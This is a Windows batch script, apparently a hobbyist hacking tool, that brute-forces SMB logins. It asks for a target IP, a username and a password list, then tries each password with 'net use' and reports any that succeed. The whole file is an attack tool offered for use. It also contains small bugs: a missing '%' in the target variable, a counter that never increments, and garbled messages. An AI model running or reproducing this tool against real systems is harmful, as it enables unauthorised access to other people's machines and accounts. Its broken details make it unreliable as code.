@echo off
chcp 65001 >nul   
echo.
echo.
echo          ██╗██████╗     ██╗    ██╗███████╗██╗      ██████╗  ██████╗███╗   ███╗███████╗
echo          ██║██╔══██╗    ██║    ██║██╔════╝██║     ██╔═══██╗██╔════╝████╗ ████║██╔════╝
echo          ██║██████╔╝    ██║ █╗ ██║█████╗  ██║     ██║   ██║██║     ██╔████╔██║█████╗  
echo          ██║██╔═══╝     ██║███╗██║██╔══╝  ██║     ██║   ██║██║     ██║╚██╔╝██║██╔══╝  
echo          ██║██║         ╚███╔███╔╝███████╗███████╗╚██████╔╝╚██████╗██║ ╚═╝ ██║███████╗
echo          ╚═╝╚═╝          ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝     ╚═╝╚══════╝
echo.
echo.                                                                                                                                                                                                                                                                                             
echo welcome IP really!                                                                                                                                                                                                                                                            
title SMB Bruteforce - by Ebola man
color A
echo.
set /p ip="Enter IP Address: " 
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=0
for /f %%a in (%wordlist%) do (
 set pass=%%a
 call :attempt
)
echo password not suck Found
pause
exit

:success
echo.
echo Password success Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
if %errorlevel% EQU 0 goto success